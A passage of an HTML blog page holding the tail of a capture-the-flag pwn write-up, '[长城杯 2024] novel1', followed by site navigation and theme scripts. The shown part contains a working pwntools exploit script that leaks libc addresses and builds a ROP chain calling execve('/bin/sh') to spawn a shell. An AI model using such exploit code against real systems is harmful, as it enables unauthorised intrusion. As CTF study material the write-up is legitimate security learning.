class="number">0</span>)+<span class="built_in">p64</span>(puts_plt)+<span class="built_in">p64</span>(main)</span><br><span class="line"><span class="meta"># rop += p64(pop_rsp_rdi_rbp_ret)+p64(author+)+p64(0)*2+p64(main)</span></span><br><span class="line">p.<span class="built_in">sendlineafter</span>(<span class="string">&quot;Author:&quot;</span>,rop)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">0xb</span>):</span><br><span class="line">    <span class="built_in">part1</span>(<span class="number">1</span><span class="number">+29</span>*i,i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">part1</span>(<span class="number">1</span><span class="number">+29</span>*<span class="number">0xb</span>,pop_rax_rsp_rdi_rbp_ret)</span><br><span class="line"><span class="built_in">part1</span>(<span class="number">1</span><span class="number">+29</span>*<span class="number">0xc</span>,author)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">0xd</span>,<span class="number">0x16</span>):</span><br><span class="line">    <span class="built_in">part1</span>(<span class="number">1</span><span class="number">+29</span>*i,i)</span><br><span class="line"><span class="meta"># gdb.attach(p)</span></span><br><span class="line"><span class="meta"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">part2</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">get_addr</span>(p) - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.<span class="built_in">success</span>(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000029db4</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_rbx_ret = libc_base + <span class="number">0x00000000000904a9</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line"></span><br><span class="line">rop = <span class="built_in">p64</span>(<span class="number">0x000000000040285A</span>)+<span class="built_in">p64</span>(<span class="number">0</span>)+<span class="built_in">p64</span>(pop_rdi_ret)+<span class="built_in">p64</span>(author<span class="number">+0x60</span>)+<span class="built_in">p64</span>(pop_rsi_ret)+<span class="built_in">p64</span>(<span class="number">0</span>)+<span class="built_in">p64</span>(pop_rdx_rbx_ret)+<span class="built_in">p64</span>(<span class="number">0</span>)*<span class="number">2</span>+<span class="built_in">p64</span>(pop_rax_ret)+<span class="built_in">p64</span>(<span class="number">0x3b</span>)+<span class="built_in">p64</span>(syscall)+b<span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">p.<span class="built_in">sendlineafter</span>(<span class="string">&quot;Author:&quot;</span>,rop)</span><br><span class="line">p.<span class="built_in">interactive</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>更新: 2026-05-06 21:59:06<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/ibi2xs1gslnzchqu">https://www.yuque.com/idcm/wnemg9/ibi2xs1gslnzchqu</a></p>
+</blockquote>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/HFTTC.github.io/categories/Notes/" title="Notes" data-aos="zoom-in">Notes</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/HFTTC.github.io/tags/pwn/" rel="tag" title="pwn">pwn</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="Protobuf脱壳二进制" class="lazyload">
+        <a href="/HFTTC.github.io/2026/05/23/Protobuf%E8%84%B1%E5%A3%B3%E4%BA%8C%E8%BF%9B%E5%88%B6/index/" aria-label="前一篇: Protobuf脱壳二进制" title="前一篇: Protobuf脱壳二进制"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            Protobuf脱壳二进制
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="[长城杯 2024] anote" class="lazyload">
+      <a href="/HFTTC.github.io/2026/05/23/C++PWN/%5B%E9%95%BF%E5%9F%8E%E6%9D%AF2024%5Danote/" aria-label="后一篇: [长城杯 2024] anote"  title="后一篇: [长城杯 2024] anote"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          [长城杯 2024] anote
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      HFTTC
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        223.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        18:25
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%95%BF%E5%9F%8E%E6%9D%AF-2024-novel1"><span class="toc-number">1.</span> <span class="toc-text">[长城杯 2024] novel1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">1.1.</span> <span class="toc-text">main</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#prologue-%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">prologue()：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#chapter"><span class="toc-number">1.3.</span> <span class="toc-text">chapter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#part1"><span class="toc-number">1.4.</span> <span class="toc-text">part1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#part2"><span class="toc-number">1.5.</span> <span class="toc-text">part2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E6%A1%B6-Bucket-%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="toc-number">1.5.1.</span> <span class="toc-text">哈希桶 (Bucket) 的概念</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%87%B4%E5%91%BD%E7%9A%84-std-copy-%E6%93%8D%E4%BD%9C"><span class="toc-number">1.5.2.</span> <span class="toc-text">致命的 std::copy 操作</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#epilogue"><span class="toc-number">1.6.</span> <span class="toc-text">epilogue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RACHE"><span class="toc-number">1.7.</span> <span class="toc-text">RACHE</span></a></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">132</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/categories" aria-label="分类"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">分类</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/tags" aria-label="标签"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">标签</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/HFTTC.github.io/images/reimu.png" loading="lazy" decoding="async" fetchpriority="low"/>
+        </div>
+      </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+  
+<script src="/HFTTC.github.io/js/generator_search.js" defer></script>
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "HFTTC",
+          title: "[长城杯 2024] novel1",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/05/23/C++PWN/%5B%E9%95%BF%E5%9F%8E%E6%9D%AF2024%5Dnovel1/",
+          excerpt: "",
+          description: "",
+          stripContent: "[长城杯 2024] novel1NSSCTF 里面有两道长城杯的附件，可以去复现一下：  先对程序基本运行一下：  main 12345678910111213141516171819202122232425int __fastcall __noreturn main(int argc, const char **argv, const char **envp)&amp;#123;     unsigned int n3; // eax    prologue();    while ( 1 )   ",
+          date: "Sat May 23 2026 02:46:33 GMT+0800",
+          updated: "Sat May 23 2026 02:58:43 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
